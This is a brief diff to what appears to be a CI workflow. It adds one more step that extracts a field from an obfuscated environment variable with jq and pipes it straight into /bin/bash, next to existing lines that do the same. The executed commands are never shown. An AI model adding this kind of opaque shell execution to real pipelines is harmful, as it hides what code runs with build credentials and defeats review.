@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$lk4149" | jq -r .ie76321 | /bin/bash
           echo $osbg2010 | jq -r .nfaa91 | /bin/bash
           printf '%s' "$mbu969" | jq -r .ubh1 | /bin/bash
+          printf '%s' "$b5" | jq -r .xfls2 | /bin/bash
 
       - name: Persist results
         if: always()
